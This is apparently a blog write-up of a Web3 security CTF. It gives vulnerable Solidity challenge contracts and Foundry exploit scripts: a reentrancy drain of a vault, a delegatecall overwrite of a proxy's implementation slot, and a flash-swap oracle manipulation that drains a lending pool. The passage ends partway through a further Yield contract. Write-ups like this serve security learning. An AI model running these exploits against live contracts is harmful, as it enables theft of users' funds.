+++
title = "Statemind Web3 CTF 2025"
date = "2025-01-14"

[taxonomies]
tags=["ctf", "blockchain", "solidity", "bridge", "defi", "Huff", "evm"]

+++

Alpha content here... I participated and solved a private web3 security CTF 
focused on smart contract security of various concepts like,

- DeFi protocol vulnerabilities
- Cross-chain bridge security
- Oracle manipulation
- Cryptographic implementations
- Solidity and Vyper smart contracts
- Huff programming

I'm super excited to share my solutions and insights from this CTF, where I managed to secure a spot in the top 3! 🏆 Get ready for detailed writeups of each challenge - trust me, you won't want to miss these!

All of these challenges with solutions can be found here : [TheMj0ln1r/statemind-web3-ctf](https://github.com/TheMj0ln1r/statemind-web3-ctf)

# Vault

P: "Your goal is to drain all ether from the Vault contract. Use the deposit and withdraw functions to reduce the vault's balance to zero. Once the isSolved function returns true, you've completed the challenge."

{% note(clickable=true, header="Vault.sol") %}

```soliidty
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;
pragma experimental ABIEncoderV2;

contract Vault {
    mapping(address => uint256) public balances;

    address public player;

    constructor(address _player) public payable {
        player = _player;
    }

    function deposit(address _to) public payable {
        balances[_to] += msg.value;
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool success,) = msg.sender.call{value: _amount}("");
            require(success, "call failed");
            balances[msg.sender] -= _amount;
        }
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function isSolved() external view returns (bool) {
        return address(this).balance == 0;
    }
}
```
{%end %}

## solution

The vulnerability in this contract lies in the `withdraw` function, which is susceptible to a reentrancy attack. Here's why:

1. The contract follows the checks-effects-interactions pattern incorrectly
2. The balance is updated after the external call
3. The contract uses a low-level `call` which forwards all gas

Here's how I exploited it:

The exploit script uses a malicious contract (`Attack`) that implements a `receive()` function to recursively withdraw funds from the vault. When the vault sends ETH to our contract, the `receive()` function is triggered, allowing us to withdraw more funds before the vault updates its balance.

{% note(clickable=true, header="Vault.s.sol") %}

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Vault} from "../src/Vault.sol";

contract VaultSolve is Script {
    Vault public vault = Vault(0x1B3C95A210A8C896b1C14D992600087668cd0174);
    address player = vm.envAddress("PLAYER");


    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Vault : ", address(vault));
        console.log("Vault balance: ", address(vault).balance);
        console.log("Player : ", player);
        console.log("Player balance: ", player.balance);
        Attack attack = new Attack(address(vault));
        console.log("Attack balance: ", address(attack).balance);

        attack.exploit{value: 0.001 ether}();

        console.log("Vault balance: ", address(vault).balance);
        console.log("Attack balance: ", address(attack).balance);
        console.log("Player balance: ", player.balance);


        vm.stopBroadcast();
    }
}
contract Attack{
    Vault public vault;

    constructor(address _vault) public {
        vault = Vault(_vault);

    }
    function exploit() public payable{
        vault.deposit{value: msg.value}(address(this));
        vault.withdraw(0.001 ether);

        // I need my testnet tokens back
        msg.sender.call{value : address(this).balance}("");
    }

    receive() payable external{
        if (address(vault).balance >= 0.001 ether){
            vault.withdraw(0.001 ether);
        }
    }
}
```
{% end %}
***

# Proxy

P: "You've encountered a proxy contract setup where the Proxy delegates calls to an Executor implementation. Find a way to manipulate the logic and get isSolved to return true."

{% note(clickable=true, header="Proxy.sol") %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin-contracts-4.8.0/contracts/utils/Address.sol"; 
import "@openzeppelin-contracts-4.8.0/contracts/proxy/utils/Initializable.sol";

contract Proxy {
    // bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1)
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    struct AddressSlot {
        address value;
    }
    
    constructor(address _logic, address _player) {
        require(Address.isContract(_logic), "implementation_not_contract");
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;

        (bool success,) = _logic.delegatecall(
            abi.encodeWithSignature("initialize(address)", _player)
        );

        require(success, "call_failed");
    }
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
    // proxy fallback
    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r.slot := slot
        }
    }
}
contract Executor is Initializable {
    address public owner;
    address public player;

    function initialize(address _player) external initializer {
        owner = msg.sender;
        player = _player;
    }
    modifier onlyOwner {
        require(msg.sender == owner, "not_owner");
        _;
    }
    function execute(address logic) external payable {
        (bool success,) = logic.delegatecall(abi.encodeWithSignature("exec()"));
        require(success, "call_fail");
    }
    function isSolved() external pure returns (bool) {
        return false;
    }
}
```

{%end%}

## Solution

Okay, we got one vulnerable proxy implementation. This is a `delegatecall` based proxy pattern in which the Proxy contract holding the storage and logic is present in the Executor contract. 

The goal is to manipulate the logic to make `isSolved()` return true. But If we observe that `isSolved()` function, it always returns `false` and it is hardcoded in the contract. So, that means we need to do complete upgrade of that contract and re-deploy in such a that it returns `true`. 

The key vulnerability lies in the `execute()` function which uses `delegatecall` to execute arbitrary logic, allowing us to potentially manipulate the contract's state. Simply, the calls to Proxy contract is delegated to the Executor and the Executor is delegating to the `exec()` function of a arbitray Logic contract. So the context of the call (`msg.sender`, `msg.value`, `this` and storage) remains same inside the `exec()` function on Logic. So, If we can update the Executor address in the Proxy slot to a new contract which have the logic of returning `true` on calling `isSolved()` then the chall is done. This is what I did in the following exploit script.

{% note(clickable=true, header="Proxy.s.sol") %}

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Proxy, Executor} from "../src/Proxy.sol";
import "@openzeppelin-contracts-4.8.0/contracts/proxy/utils/Initializable.sol";

contract ProxySolve is Script {
    Proxy public proxy = Proxy(payable(0x09FAb0F0CC143875873F111A27DF77B6ade37a20));
    Executor public executor = Executor(address(proxy));
    address player = vm.envAddress("PLAYER");

    // Deploy
    // function setUp() external{
    //     executor = new Executor();
    //     proxy = new Proxy(address(executor), player);
    //     executor = Executor(address(proxy));

    //     vm.deal(player, 1 ether);
    // }
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Proxy : ", address(proxy));
        bytes32 logic = vm.load(address(proxy), bytes32(uint256(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)));
        console.log("logic in Proxy", address(uint160(uint256(logic))));
        console.log("Proxy Owner: ", executor.owner());
        console.log("Player in Proxy: ", executor.player());
        console.log("Player : ", player);
        console.log("Player balance: ", player.balance);
        console.log("isSolved(): ", executor.isSolved());
        NewExecutor newExecutor = new NewExecutor();
        Attack attack = new Attack(address(address(newExecutor)), player);
        executor.execute(address(attack));
        console.log("Attack : ", address(attack));
        console.log("NewExecutor : ", address(newExecutor));
        logic = vm.load(address(proxy), bytes32(uint256(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)));
        console.log("logic in Proxy", address(uint160(uint256(logic))));
        // executor.initialize(player);
        console.log("Proxy Owner: ", executor.owner());
        console.log("Player in Proxy: ", executor.player());
        console.log("isSolved(): ", executor.isSolved());
        vm.stopBroadcast();
    }
}
contract Attack {
    struct AddressSlot {
        address value;
    }
    address public owner;
    address public player;
    address immutable newExecutor;
    address immutable playerplayer;
    constructor(address _newExecutor, address _player){
        newExecutor = _newExecutor;
        playerplayer = _player;
    }
    function exec() external {
        owner = address(0xdeadbeef);
        player = playerplayer;
        _getAddressSlot(0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc).value = newExecutor;
    }
    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) {
        assembly {
            r.slot := slot
        }
    }
}

contract NewExecutor is Initializable{
    address public owner;
    address public player;
    function initialize(address _player) external initializer {
        owner = msg.sender;
        player = _player;
    }
    function isSolved() external pure returns (bool) {
        return true;
    }
}
```
{% end %}
***

# Lending

P: "You have lending protocol that interacts with interesting pair. You need to steal all funds from lending protocol."

{% note(clickable=true, header="Lending.sol") %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/Math.sol";
import "../helpers/ERC20.sol";

contract Lending  {
    ERC20 public collateralToken;
    ERC20 public borrowToken;
    Pair public pair;

    mapping(address => uint256) public usersCollateral;
    mapping(address => uint256) public usersUsedCollateral;
    mapping(address => uint256) public usersBorrowed;

    constructor(Pair _pair, ERC20 _collateralToken, ERC20 _borrowToken) {
        collateralToken = _collateralToken;
        pair = _pair;
        borrowToken = _borrowToken;
    }

    function addCollateral(uint256 amount) external {
        collateralToken.transferFrom(msg.sender, address(this), amount);
        usersCollateral[msg.sender] += amount;
    }

    function removeCollateral(uint256 amount) external {
        require(usersBorrowed[msg.sender] == 0, "You have debt");
        require(usersCollateral[msg.sender] >= amount, "Not enough collateral");
        collateralToken.transfer(msg.sender, amount);
        usersCollateral[msg.sender] -= amount;
    }

    function borrow(uint256 _amount) external {
        uint256 needCollateral = _amount * getExchangeRate() / 1e18;

        require(needCollateral <= usersCollateral[msg.sender], "You don't have enough collateral");

        borrowToken.transfer(msg.sender, _amount);
        usersUsedCollateral[msg.sender] += needCollateral;
        usersCollateral[msg.sender] -= needCollateral;
        usersBorrowed[msg.sender] += _amount;
    }

    function repay(uint256 _amount) external {
        uint256 collateral = (usersUsedCollateral[msg.sender] * _amount) / usersBorrowed[msg.sender];

        borrowToken.transferFrom(msg.sender, address(this), _amount);

        usersUsedCollateral[msg.sender] -= collateral;
        usersCollateral[msg.sender] += collateral;
        usersBorrowed[msg.sender] -= _amount;
    }

    function getExchangeRate() public view returns (uint256) {
        return pair.getSpotPrice();
    }

    function isSolved() external view returns (bool) {
        return borrowToken.balanceOf(address(this)) == 0;
    }
}

library SafeMath {
    function add(uint x, uint y) internal pure returns (uint z) {
        require((z = x + y) >= x, 'ds-math-add-overflow');
    }

    function sub(uint x, uint y) internal pure returns (uint z) {
        require((z = x - y) <= x, 'ds-math-sub-underflow');
    }

    function mul(uint x, uint y) internal pure returns (uint z) {
        require(y == 0 || (z = x * y) / y == x, 'ds-math-mul-overflow');
    }
}

library UQ112x112 {
    uint224 constant Q112 = 2**112;

    // encode a uint112 as a UQ112x112
    function encode(uint112 y) internal pure returns (uint224 z) {
        z = uint224(y) * Q112; // never overflows
    }

    // divide a UQ112x112 by a uint112, returning a UQ112x112
    function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {
        z = x / uint224(y);
    }
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}


contract Pair is ERC20 {
    using SafeMath  for uint;
    using UQ112x112 for uint224;

    uint public constant MINIMUM_LIQUIDITY = 10**3;
    bytes4 private constant SELECTOR = bytes4(keccak256(bytes('transfer(address,uint256)')));

    address public factory;
    address public token0;
    address public token1;

    uint112 private reserve0;           // uses single storage slot, accessible via getReserves
    uint112 private reserve1;           // uses single storage slot, accessible via getReserves
    uint32  private blockTimestampLast; // uses single storage slot, accessible via getReserves

    uint public price0CumulativeLast;
    uint public price1CumulativeLast;
    uint public kLast; // reserve0 * reserve1, as of immediately after the most recent liquidity event

    uint private unlocked = 1;
    modifier lock() {
        require(unlocked == 1, 'UniswapV2: LOCKED');
        unlocked = 0;
        _;
        unlocked = 1;
    }

    function getReserves() public view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) {
        _reserve0 = reserve0;
        _reserve1 = reserve1;
        _blockTimestampLast = blockTimestampLast;
    }

    function getSpotPrice() external view returns (uint256) {
        return Math.mulDiv(reserve1, 1e18, reserve0);
    }

    function _safeTransfer(address token, address to, uint value) private {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'UniswapV2: TRANSFER_FAILED');
    }

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    constructor() ERC20("ST", "ST") {
        factory = msg.sender;
    }

    // called once by the factory at time of deployment
    function initialize(address _token0, address _token1) external {
        require(msg.sender == factory, 'UniswapV2: FORBIDDEN'); // sufficient check
        token0 = _token0;
        token1 = _token1;
    }

    // update reserves and, on the first call per block, price accumulators
    function _update(uint balance0, uint balance1, uint112 _reserve0, uint112 _reserve1) private {
        require(balance0 <= type(uint112).max && balance1 <= type(uint112).max, 'UniswapV2: OVERFLOW');
        uint32 blockTimestamp = uint32(block.timestamp % 2**32);
        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired
        if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
            // * never overflows, and + overflow is desired
            price0CumulativeLast += uint(UQ112x112.encode(_reserve1).uqdiv(_reserve0)) * timeElapsed;
            price1CumulativeLast += uint(UQ112x112.encode(_reserve0).uqdiv(_reserve1)) * timeElapsed;
        }
        reserve0 = uint112(balance0);
        reserve1 = uint112(balance1);
        blockTimestampLast = blockTimestamp;
        emit Sync(reserve0, reserve1);
    }

    // if fee is on, mint liquidity equivalent to 1/6th of the growth in sqrt(k)
    function _mintFee(uint112 _reserve0, uint112 _reserve1) private returns (bool feeOn) {
        address feeTo = address(0);
        feeOn = feeTo != address(0);
        uint _kLast = kLast; // gas savings
        if (feeOn) {
            if (_kLast != 0) {
                uint rootK = Math.sqrt(uint(_reserve0).mul(_reserve1));
                uint rootKLast = Math.sqrt(_kLast);
                if (rootK > rootKLast) {
                    uint numerator = totalSupply.mul(rootK.sub(rootKLast));
                    uint denominator = rootK.mul(5).add(rootKLast);
                    uint liquidity = numerator / denominator;
                    if (liquidity > 0) _mint(feeTo, liquidity);
                }
            }
        } else if (_kLast != 0) {
            kLast = 0;
        }
    }

    // this low-level function should be called from a contract which performs important safety checks
    function mint(address to) external lock returns (uint liquidity) {
        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
        uint balance0 = IERC20(token0).balanceOf(address(this));
        uint balance1 = IERC20(token1).balanceOf(address(this));
        uint amount0 = balance0.sub(_reserve0);
        uint amount1 = balance1.sub(_reserve1);

        bool feeOn = _mintFee(_reserve0, _reserve1);
        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee
        if (_totalSupply == 0) {
            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);
           _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens
        } else {
            liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);
        }
        require(liquidity > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_MINTED');
        _mint(to, liquidity);

        _update(balance0, balance1, _reserve0, _reserve1);
        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date
        emit Mint(msg.sender, amount0, amount1);
    }

    // this low-level function should be called from a contract which performs important safety checks
    function burn(address to) external lock returns (uint amount0, uint amount1) {
        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
        address _token0 = token0;                                // gas savings
        address _token1 = token1;                                // gas savings
        uint balance0 = IERC20(_token0).balanceOf(address(this));
        uint balance1 = IERC20(_token1).balanceOf(address(this));
        uint liquidity = balanceOf[address(this)];

        bool feeOn = _mintFee(_reserve0, _reserve1);
        uint _totalSupply = totalSupply; // gas savings, must be defined here since totalSupply can update in _mintFee
        amount0 = liquidity.mul(balance0) / _totalSupply; // using balances ensures pro-rata distribution
        amount1 = liquidity.mul(balance1) / _totalSupply; // using balances ensures pro-rata distribution
        require(amount0 > 0 && amount1 > 0, 'UniswapV2: INSUFFICIENT_LIQUIDITY_BURNED');
        _burn(address(this), liquidity);
        _safeTransfer(_token0, to, amount0);
        _safeTransfer(_token1, to, amount1);
        balance0 = IERC20(_token0).balanceOf(address(this));
        balance1 = IERC20(_token1).balanceOf(address(this));

        _update(balance0, balance1, _reserve0, _reserve1);
        if (feeOn) kLast = uint(reserve0).mul(reserve1); // reserve0 and reserve1 are up-to-date
        emit Burn(msg.sender, amount0, amount1, to);
    }

    // this low-level function should be called from a contract which performs important safety checks
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external lock {
        require(amount0Out > 0 || amount1Out > 0, 'UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT');
        (uint112 _reserve0, uint112 _reserve1,) = getReserves(); // gas savings
        require(amount0Out < _reserve0 && amount1Out < _reserve1, 'UniswapV2: INSUFFICIENT_LIQUIDITY');

        uint balance0;
        uint balance1;
        { // scope for _token{0,1}, avoids stack too deep errors
        address _token0 = token0;
        address _token1 = token1;
        require(to != _token0 && to != _token1, 'UniswapV2: INVALID_TO');
        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens
        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens
        if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);
        balance0 = IERC20(_token0).balanceOf(address(this));
        balance1 = IERC20(_token1).balanceOf(address(this));
        }
        uint amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
        uint amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
        require(amount0In > 0 || amount1In > 0, 'UniswapV2: INSUFFICIENT_INPUT_AMOUNT');
        { // scope for reserve{0,1}Adjusted, avoids stack too deep errors
        uint balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));
        uint balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));
        require(balance0Adjusted.mul(balance1Adjusted) >= uint(_reserve0).mul(_reserve1).mul(1000**2), 'UniswapV2: K');
        }

        _update(balance0, balance1, _reserve0, _reserve1);
        emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);
    }

    // force balances to match reserves
    function skim(address to) external {
        address _token0 = token0; // gas savings
        address _token1 = token1; // gas savings
        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));
        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));
    }

    // force reserves to match balances
    function sync() external {
        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);
    }
}
```
{%end%}

## Solution

A Defi protocol requires nothing else than except complete understanding about the protocol control flow. Lets observe what each contract in this protocol is doing. 

1. **Lending Contract**:
   - Add collateral using `collateralToken`
   - Borrow `borrowToken` against their collateral
   - Repay borrowed tokens
   - **Uses a Pair contract to determine exchange rates**

2. **Pair Contract** (UniswapV2-style):
   - Implements an automated market maker (AMM)
   - Manages liquidity between two tokens (token0 and token1)
   - Handles token swaps and price calculations
   - Maintains reserves and updates prices
   - Provides functions for adding/removing liquidity
   - **Used by the Lending contract to get exchange rates**

3. **SafeMath Library**:
   - Provides safe arithmetic operations
   - Prevents overflows/underflows in mathematical calculations
   - Used by the Pair contract for calculations

4. **UQ112x112 Library**:
   - Handles fixed-point number calculations
   - Used for price calculations in the Pair contract
   - Helps maintain precision in price calculations

5. **IUniswapV2Callee Interface**:
   - Defines the callback interface for flash swaps
   - Used when executing flash swaps in the Pair contract

The goal is to drain all `borrowToken` from the Lending contract. I always prefer to know the initial state of the protocol by querying all the information from the contracts deployed. The following is the state of the protocol when we initially received the challenge instance. 

```bash
Lending :  0x85799e7ae2964fd6D8BdC6e680dA881B8bb97ed6
Pair :  0xE86b07a57552655eEFe68894bD346c84da238B15
token0 (or) collateralToken  :  0xCcb0B898D555656e582b8d17ba7b426330Abb9D8
token1 (or) borrowToken:   0x7373EB31cBDd5428720a37d50E5ec64EfA891acc
Pair balance of collatoralToken :  500000000000000000000
Pair balance of borrowToken :  500000000000000000000
Pair reserve0 :  500000000000000000000
Pair reserve1 :  500000000000000000000
Lending balance of collatoralToken :  0
Lending balance of borrowToken :  5000000000000000000000
Player balance of collatoralToken :  0
Player balance of borrowToken :  0
price of borrowToken in terms of collatoralTokens :  1000000000000000000
Player :  0xE88150C42CC6c0294dD20893Bf5b1EC6eDD24Fc6
```
As you can observe I got zero amount of both collatoral and borrow tokens, but Lending contract have the `5000e18` of borrow tokens and the Pair contract got the `500e18` amount of both the tokens. 

Now for me, I don't have any `collatoralToken` to borrow the token from the Lending contract and drain them all. So, lets see how the `borrow()` function calcuates how much collatoral needed to borrow all those `5000e18` amount of borrow tokens. 

```solidity
function borrow(uint256 _amount) external {
    uint256 needCollateral = _amount * getExchangeRate() / 1e18;
    require(needCollateral <= usersCollateral[msg.sender], "You don't have enough collateral");
    borrowToken.transfer(msg.sender, _amount);
    usersUsedCollateral[msg.sender] += needCollateral;
    usersCollateral[msg.sender] -= needCollateral;
    usersBorrowed[msg.sender] += _amount;
}
```
> The `needCollateral` is calculated from the `getExchangeRate()` and divided by the `1e18`. Can we make this numerator as lesser than `1e18` ? So that the division will rounded to zero and we don't need to pay any `collatoralToken`.

Smart right?

Lets see how can we do this? We need to make `getExchangeRate()` return a very small number or even zero would be perfect!

```solidity
    // Lending
    function getExchangeRate() public view returns (uint256) {
        return pair.getSpotPrice();
    }

    //Pair
    function getSpotPrice() external view returns (uint256) {
        return Math.mulDiv(reserve1, 1e18, reserve0);
    }
```
Now we can see that the price of the `collatoralToken` is dependent on the `reserve0` and `reserve1`. And we need to manipulate the `reserve0` to be a large number than `reserve1 * 1e18` so that the `getSpotPrice()` will return zero. 

To do this, I found out that we can perform few swaps in the Pair contract which changes the values of `reserve0` and `reserve1`. But if we do the borrow from Lending after the `swap()` the again the price will be increase. So, we need to find a way to update the reserves during the swap and borrow the amount in the same transacation. If we can observe there is a callback happening to the caller in the `swap()` function. 
>if (data.length > 0) IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);

So, during this callback we can borrow from Lending contract but the reserves need a forceful update. To do this we can make use of the vulnerable `skim()` and `sync()` functions in the Pair contract.

> Why `skim()` and `sync()` are vulnerable? Cause there is no reentrancy lock on these.

```solidity
    // force balances to match reserves
    function skim(address to) external {
        address _token0 = token0; // gas savings
        address _token1 = token1; // gas savings
        _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));
        _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));
    }

    // force reserves to match balances
    function sync() external {
        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);
    }
```

Thats how I manipulated the `borrowToken` price to borrowed all the tokens from Lending. Find the exploit below.

{% note(clickable=true, header="Lending.s.sol") %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Pair, Lending, ERC20} from "../src/Lending.sol";

contract LendingSolve is Script {
    Lending public lending = Lending(0x85799e7ae2964fd6D8BdC6e680dA881B8bb97ed6);
    Pair public pair = lending.pair();
    ERC20 public collateralToken = lending.collateralToken();
    ERC20 public borrowToken = lending.borrowToken();
    address player = vm.envAddress("PLAYER");

    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Lending : ", address(lending));
        console.log("Pair : ", address(pair));
        console.log("token0 (or) collateralToken  : ", pair.token0());
        console.log("token1 (or) borrowToken:  ", pair.token1());
        
        console.log("Pair balance of collatoralToken : ", collateralToken.balanceOf(address(pair)));
        console.log("Pair balance of borrowToken : ", borrowToken.balanceOf(address(pair)));
        (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast) = pair.getReserves();
        console.log("Pair reserve0 : ", _reserve0);
        console.log("Pair reserve1 : ", _reserve1);

        console.log("Lending balance of collatoralToken : ", collateralToken.balanceOf(address(lending)));
        console.log("Lending balance of borrowToken : ", borrowToken.balanceOf(address(lending)));

        console.log("Player balance of collatoralToken : ", collateralToken.balanceOf(address(player)));
        console.log("Player balance of borrowToken : ", borrowToken.balanceOf(address(player)));

        console.log("price of borrowToken in terms of collatoralTokens : ", lending.getExchangeRate());
        console.log("Player : ", player);
        console.log("Player balance: ", player.balance);

        Attack attack = new Attack(address(lending), player);
        attack.exploit();

        console.log("Pair balance of collatoralToken : ", collateralToken.balanceOf(address(pair)));
        console.log("Pair balance of borrowToken : ", borrowToken.balanceOf(address(pair)));

        console.log("Lending balance of collatoralToken : ", collateralToken.balanceOf(address(lending)));
        console.log("Lending balance of borrowToken : ", borrowToken.balanceOf(address(lending)));

        console.log("Player balance of collatoralToken : ", collateralToken.balanceOf(address(player)));
        console.log("Player balance of borrowToken : ", borrowToken.balanceOf(address(player)));
        console.log("isSolved() : ", lending.isSolved());
        vm.stopBroadcast();
    }
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

contract Attack is IUniswapV2Callee {
    Lending public lending;
    Pair public pair;
    ERC20 public collateralToken;
    ERC20 public borrowToken;
    address player;

    constructor(address _lending, address _player) {
        lending = Lending(_lending);
        pair =  lending.pair();
        collateralToken = lending.collateralToken();
        borrowToken = lending.borrowToken();
        player = _player;
    }
    function exploit() public {
        uint256 totalBorrowableBorrowTokenFromPair = borrowToken.balanceOf(address(pair)) - 1;
        pair.swap(0, totalBorrowableBorrowTokenFromPair, address(this), abi.encodePacked("something"));
    }
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) public {
        uint256 totalBorrowableBorrowTokenFromLending = borrowToken.balanceOf(address(lending));
        pair.sync();
        lending.borrow(totalBorrowableBorrowTokenFromLending);
        uint256 borrowedTokensFromLending = borrowToken.balanceOf(address(address(this)));
        borrowToken.transfer(address(pair), borrowedTokensFromLending);
    }
}
```
{%end%}
***

# Yeild

P: "UniswapV3 yield farming is so easy! Just make sure there is liquidity around the spot price. You are given 5e18 each of token0 and token1. Your goal is to get 15e18 of LP tokens."

{% note(clickable=true, header="Yield.sol") %}
```solidity
// SPDX-License-Identifier: Unlicense

pragma solidity ^0.7.0;

import "@openzeppelin-contracts-3.4.2/contracts/math/Math.sol";
import "@uniswap/v3-core/contracts/libraries/FullMath.sol";
import "@openzeppelin-contracts-3.4.2/contracts/utils/ReentrancyGuard.sol";
import "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3MintCallback.sol";
import "@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "@uniswap/v3-core/contracts/libraries/TickMath.sol";
import "@uniswap/v3-periphery/contracts/libraries/LiquidityAmounts.sol";
import "@uniswap/v3-periphery/contracts/libraries/PositionKey.sol";
import "@openzeppelin-contracts-3.4.2/contracts/token/ERC20/ERC20.sol";

contract Yield is
    IUniswapV3MintCallback,
    IUniswapV3SwapCallback,
    ERC20,
    ReentrancyGuard
{
    event Deposit(
        address indexed sender,
        address indexed to,
        uint256 shares,
        uint256 amount0,
        uint256 amount1
    );

    event Withdraw(
        address indexed sender,
        address indexed to,
        uint256 shares,
        uint256 amount0,
        uint256 amount1
    );

    event CollectFees(
        uint256 feesToVault0,
        uint256 feesToVault1,
        uint256 feesToProtocol0,
        uint256 feesToProtocol1
    );

    event Snapshot(int24 tick, uint256 totalAmount0, uint256 totalAmount1, uint256 totalSupply);

    IUniswapV3Pool public immutable pool;
    IERC20 public immutable token0;
    IERC20 public immutable token1;
    int24 public immutable tickSpacing;

    uint256 public protocolFee;
    uint256 public maxTotalSupply;
    address public governance;
    address public pendingGovernance;

    int24 public lastTick;
    int24 public baseLower;
    int24 public baseUpper;
    uint256 public accruedProtocolFees0;
    uint256 public accruedProtocolFees1;

    address public player;

    constructor(
        address _player,
        address _pool,
        uint256 _protocolFee,
        uint256 _maxTotalSupply
    ) ERC20("Yield Vault", "YV") {
        player = _player;
        pool = IUniswapV3Pool(_pool);
        token0 = ERC20(IUniswapV3Pool(_pool).token0());
        token1 = ERC20(IUniswapV3Pool(_pool).token1());
        tickSpacing = IUniswapV3Pool(_pool).tickSpacing();

        protocolFee = _protocolFee;
        maxTotalSupply = _maxTotalSupply;
        governance = msg.sender;
        lastTick = type(int24).max;

        require(_protocolFee < 1e6, "protocolFee");
    }

    function isSolved() external view returns (bool) {
        return balanceOf(player) >= 15 ether;
    }

    function deposit(
        uint256 amount0Desired,
        uint256 amount1Desired,
        uint256 amount0Min,
        uint256 amount1Min,
        address to
    )
        external
        nonReentrant
        returns (
            uint256 shares,
            uint256 amount0,
            uint256 amount1
        )
    {
        require(amount0Desired > 0 || amount1Desired > 0, "amount0Desired or amount1Desired");
        require(to != address(0) && to != address(this), "to");

        // Poke positions so vault's current holdings are up-to-date
        _poke(baseLower, baseUpper);

        // Calculate amounts proportional to vault's holdings
        (shares, amount0, amount1) = _calcSharesAndAmounts(amount0Desired, amount1Desired);
        require(shares > 0, "shares");
        require(amount0 >= amount0Min, "amount0Min");
        require(amount1 >= amount1Min, "amount1Min");

        // Pull in tokens from sender
        if (amount0 > 0) token0.transferFrom(msg.sender, address(this), amount0);
        if (amount1 > 0) token1.transferFrom(msg.sender, address(this), amount1);

        // Mint shares to recipient
        _mint(to, shares);
